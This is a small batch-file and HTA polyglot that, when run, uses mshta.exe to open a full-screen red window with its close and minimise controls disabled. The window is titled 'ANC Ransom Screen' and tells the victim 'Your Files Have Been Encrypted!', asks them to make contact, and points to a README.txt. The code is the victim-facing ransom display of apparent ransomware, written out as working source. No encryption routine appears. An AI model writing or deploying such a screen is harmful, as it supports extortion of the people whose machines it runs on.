@echo off
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->

<html>
    <head>
        <title>ANC Ransom Screen</title>
    <hta:application id="oBVC" 
                     applicationname="ANC-ON-TOP"  
                     version="1.0" 
                     maximizebutton="no" 
                     minimizebutton="no" 
                     sysmenu="no" 
                     Caption="no" 
                     windowstate="maximize"/> 
    <style>
        #texto2{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
</head>
<body bgcolor="#8c1d1d" scroll="no">
    <font face="Lucida Console" size="4" color="white">
<center><p> - ANC Ransomware - </p></center>
<div id="texto2">
    Oops, Your Files Have Been Encrypted!<br>
    <br><br>
    You're files are not lost though. Contact us!<br>
    <br><br>
   Open README.txt for more info.<br>
    <br><br><br>
    <img id="imagen" alt="Candado" src="https://i.imgur.com/t8UbO1s.png" height="130" width="100">
</div>
</body>
</html>

exit
